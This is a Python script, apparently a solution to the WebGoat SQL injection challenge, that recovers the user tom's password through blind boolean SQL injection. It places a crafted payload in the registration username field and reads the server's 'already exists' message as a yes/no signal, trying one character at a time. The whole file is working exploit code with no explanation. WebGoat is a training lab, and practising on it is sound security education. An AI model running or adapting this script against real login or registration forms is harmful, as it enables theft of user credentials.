import json
import requests

ALPHABET = 'abcdefghijklmnopqrstuvwxyz'  # The chars to test for the password
COOKIE = {  # To be changed for each session
    'JSESSIONID': '2TmZuI_KXOoaCQ8iXhjQ3z22hcl1kA6gZTDkvpVk',
}
URL = 'http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge'


def break_tom_password():
    alphabet_index = 0
    password_index = 0
    password = ''

    while True:  # Run it until the password is found
        payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, ALPHABET[alphabet_index])

        # Prepare the request
        data = {
            'username_reg': payload,
            'email_reg': 'x@x',
            'password_reg': 'x',
            'confirm_password_reg': 'x'
        }

        r = requests.put(URL, cookies=COOKIE, data=data)  # Send the request

        try:
            response = json.loads(r.text)
        except:
            print("Wrong Cookie.")
            return

        if "already exists please try to register with a different username" not in response['feedback']:
            alphabet_index += 1
            if alphabet_index > len(ALPHABET) - 1:
                return
        else:
            password += ALPHABET[alphabet_index]
            print(password)
            alphabet_index = 0
            password_index += 1


break_tom_password()
